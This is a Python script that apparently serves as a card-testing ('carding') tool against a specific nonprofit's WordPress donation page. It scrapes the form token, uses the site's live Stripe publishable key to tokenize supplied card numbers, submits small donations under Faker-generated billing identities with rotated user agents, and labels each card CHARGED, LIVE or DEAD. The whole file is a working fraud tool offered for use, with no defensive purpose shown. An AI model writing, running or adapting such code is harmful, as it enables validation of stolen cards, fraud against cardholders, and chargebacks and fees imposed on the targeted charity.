import asyncio
import aiohttp
import random
import json
import uuid
import time
from faker import Faker

DONATION_URL = "https://resilienceprisonproject.com/donate/"
STRIPE_PK = "pk_live_51OHU82G6QgVuFQ5rphUjLzuzShgA7hPvcXGSNikT6JwVc8qCpML2iCUsQUpT5f59KLdPrAz0aJiScC6BcVsEZ0VN00l8UKpCiC"
WPFORMS_ID = "4987"
POST_ID = "4021"
AUTHOR = "2"

CARD_COUNTRIES = {
    'visa': ['en_US', 'en_GB', 'en_CA', 'en_AU'],
    'mastercard': ['en_US', 'en_GB', 'en_CA'],
    'amex': ['en_US', 'en_GB'],
    'discover': ['en_US'],
}

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
]

def detect_card_brand(card_number):
    card_clean = card_number.replace(' ', '').replace('-', '')
    if not card_clean: return 'unknown'
    first = card_clean[0]
    first_two = card_clean[:2] if len(card_clean) >= 2 else ''
    if first == '4': return 'visa'
    elif first_two in ['51', '52', '53', '54', '55'] or (2221 <= int(card_clean[:4]) <= 2720 if len(card_clean) >= 4 and card_clean[:4].isdigit() else False): return 'mastercard'
    elif first_two in ['34', '37']: return 'amex'
    elif first_two in ['60', '64', '65'] or first_two[:2] == '62': return 'discover'
    else: return 'visa'

def generate_billing_details(card_brand):
    locales = CARD_COUNTRIES.get(card_brand, ['en_US'])
    locale = random.choice(locales)
    fake = Faker(locale)
    country = locale.split('_')[1] if '_' in locale else 'US'
    if country == 'US':
        state, postal = fake.state_abbr(), fake.zipcode()
    elif country == 'CA':
        state, postal = (fake.province_abbr() if hasattr(fake, 'province_abbr') else 'ON'), fake.postcode()
    else:
        state, postal = fake.city(), fake.postcode()
    return {
        'name': fake.name(), 'first_name': fake.first_name(), 'last_name': fake.last_name(),
        'email': fake.email(), 'phone': fake.phone_number() if hasattr(fake, 'phone_number') else '',
        'address': {'line1': fake.street_address(), 'city': fake.city(), 'state': state, 'postal_code': postal, 'country': country}
    }

async def get_wpforms_token(session):
    headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'user-agent': random.choice(USER_AGENTS)}
    try:
        async with session.get(DONATION_URL, headers=headers) as response:
            html = await response.text()
            data_token_start = html.find('data-token="')
            if data_token_start != -1:
                token_start = data_token_start + 12
                token_end = html.find('"', token_start)
                return html[token_start:token_end]
            return str(uuid.uuid4()).replace('-', '')
    except: return str(uuid.uuid4()).replace('-', '')

async def create_payment_method(session, card_number, exp_month, exp_year, cvv, billing):
    card_clean = card_number.replace(' ', '').replace('-', '')
    headers = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': random.choice(USER_AGENTS)}
    client_session_id = str(uuid.uuid4())
    form_data = {
        'type': 'card', 'card[number]': card_clean, 'card[cvc]': str(cvv), 'card[exp_year]': str(exp_year), 'card[exp_month]': str(exp_month).zfill(2),
        'billing_details[address][postal_code]': billing['address']['postal_code'], 'billing_details[address][country]': billing['address']['country'],
        'billing_details[email]': billing['email'], 'key': STRIPE_PK, 'guid': str(uuid.uuid4()).replace('-', ''), 'muid': str(uuid.uuid4()).replace('-', ''), 'sid': str(uuid.uuid4()).replace('-', ''),
        'payment_user_agent': 'stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; payment-element', 'client_attribution_metadata[client_session_id]': client_session_id
    }
    try:
        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=form_data, timeout=30) as response:
            result = await response.json() or {}
            if response.status == 200: 
                return {'status': 'success', 'payment_method_id': result.get('id'), 'card_info': result.get('card', {}), 'client_session_id': client_session_id}
            err_data = result.get('error') or {}
            return {'status': 'failed', 'error': err_data.get('message', 'Unknown error')}
    except Exception as e: return {'status': 'error', 'error': str(e)}

async def submit_donation_form(session, payment_method_id, billing, amount, token):
    headers = {'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://resilienceprisonproject.com', 'referer': 'https://resilienceprisonproject.com/donate/', 'user-agent': random.choice(USER_AGENTS), 'x-requested-with': 'XMLHttpRequest'}
    form_data = {
        'wpforms[fields][0][first]': billing['first_name'], 'wpforms[fields][0][last]': billing['last_name'], 'wpforms[fields][8]': 'No', 'wpforms[fields][6]': billing['phone'],
        'wpforms[fields][7]': 'One Time', 'wpforms[fields][2]': f"{amount:.2f}", 'wpforms[fields][4]': 'No', 'wpforms[fields][1]': billing['email'],
        'wpforms[fields][11]': f"${amount:.2f}", 'wpforms[id]': WPFORMS_ID, 'wpforms[author]': AUTHOR, 'wpforms[post_id]': POST_ID,
        'wpforms[payment_method_id]': payment_method_id, 'wpforms[token]': token, 'wpforms[submit]': 'wpforms-submit', 'action': 'wpforms_submit',
        'page_url': DONATION_URL, 'page_title': 'Donate', 'page_id': POST_ID, 'start_timestamp': str(int(time.time() * 1000) - 60000), 'end_timestamp': str(int(time.time() * 1000))
    }
    try:
        async with session.post('https://resilienceprisonproject.com/wp-admin/admin-ajax.php', headers=headers, data=form_data, timeout=30) as response:
            result = await response.json() or {}
            if response.status == 200 and result.get('success'): return {'status': 'success', 'response': result}
            err_data = (result.get('data') or {}).get('error', 'Unknown error')
            return {'status': 'failed', 'error': err_data, 'response': result}
    except Exception as e: return {'status': 'error', 'error': str(e)}

async def confirm_payment_intent(session, payment_intent_client_secret, payment_method_id, client_session_id):
    payment_intent_id = payment_intent_client_secret.split('_secret_')[0]
    headers = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': random.choice(USER_AGENTS)}
    form_data = {'use_stripe_sdk': 'true', 'mandate_data[customer_acceptance][type]': 'online', 'mandate_data[customer_acceptance][online][infer_from_client]': 'true', 'return_url': DONATION_URL, 'payment_method': payment_method_id, 'key': STRIPE_PK, 'client_attribution_metadata[client_session_id]': client_session_id, 'client_secret': payment_intent_client_secret}
    try:
        async with session.post(f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm', headers=headers, data=form_data, timeout=30) as response:
            result = await response.json() or {}
            if response.status == 200:
                status = result.get('status')
                if status == 'succeeded': 
                    charge_data = (result.get('charges') or {}).get('data', [{}])[0] or {}
                    return {'status': 'success', 'payment_status': status, 'charge_id': charge_data.get('id', 'N/A'), 'amount': result.get('amount', 0) / 100}
                elif status == 'requires_action': return {'status': 'requires_action', 'payment_status': status, 'next_action': result.get('next_action', {})}
                error = result.get('last_payment_error') or {}
                return {'status': 'failed', 'payment_status': status, 'error': error.get('message', 'Payment failed'), 'decline_code': error.get('decline_code', 'N/A')}
            err_obj = result.get('error') or {}
            return {'status': 'failed', 'error': err_obj.get('message', 'Unknown error'), 'decline_code': err_obj.get('decline_code', 'N/A')}
    except Exception as e: return {'status': 'error', 'error': str(e)}

async def check_str(cc, mm, yy, cvv, amount: float = 1.00):
    async with aiohttp.ClientSession() as session:
        brand = detect_card_brand(cc)
        billing = generate_billing_details(brand)
        token = await get_wpforms_token(session)
        pm_result = await create_payment_method(session, cc, mm, yy, cvv, billing)
        if pm_result['status'] != 'success': return {'status': 'DEAD', 'response': pm_result.get('error', 'Declined')}
        form_result = await submit_donation_form(session, pm_result['payment_method_id'], billing, amount, token)
        if form_result['status'] != 'success': return {'status': 'DEAD', 'response': form_result.get('error', 'Form Failed')}
        secret = (form_result['response'].get('data') or {}).get('payment_intent_client_secret')
        if not secret: return {'status': 'DEAD', 'response': 'No Intent'}
        confirm = await confirm_payment_intent(session, secret, pm_result['payment_method_id'], pm_result['client_session_id'])
        if confirm['status'] == 'success': return {'status': 'CHARGED', 'response': f"Charged ${confirm['amount']}", 'charge_id': confirm['charge_id']}
        if confirm['status'] == 'requires_action': return {'status': 'LIVE', 'response': '3D Secure Required'}
        return {'status': 'DEAD', 'response': f"{confirm.get('error', 'Declined')} ({confirm.get('decline_code', 'N/A')})"}
